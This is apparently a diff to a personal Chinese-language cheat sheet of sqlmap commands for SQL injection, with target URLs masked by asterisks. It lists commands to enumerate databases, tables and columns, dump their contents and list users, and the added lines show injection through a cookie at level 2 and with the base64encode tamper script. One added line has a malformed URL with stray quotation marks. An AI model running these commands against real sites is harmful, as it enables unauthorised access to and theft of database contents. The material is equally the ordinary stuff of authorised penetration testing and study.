@@ -16,7 +16,9 @@ sqlmap -u http://****.php?id=1 -D name -tables;
 sqlmap -u http://****.php?id=1 -D name -T name --columns
 sqlmap -u http://****.php?id=1 -D name -T name -C name -dump
 
-sqlmap -u "http://*****.php" --cookie="id=1"  在cookie的地方进行注入
+cookie注入
+sqlmap -u "http://*****.php" --cookie="id=1" --level 2  在cookie的地方进行注入,一般来说cookie用等级2来注入 
+sqlmap -u "http://""".php" --cookie="YmsW" --tamper base64encode.py --dbs --level 2 cookie是用这个base64来注入的，就用base64encode.py来注入
 
 sqlmap -u http：//****.php?id=1 --users
 sqlmap -u http://****.php?id=1 --current-user
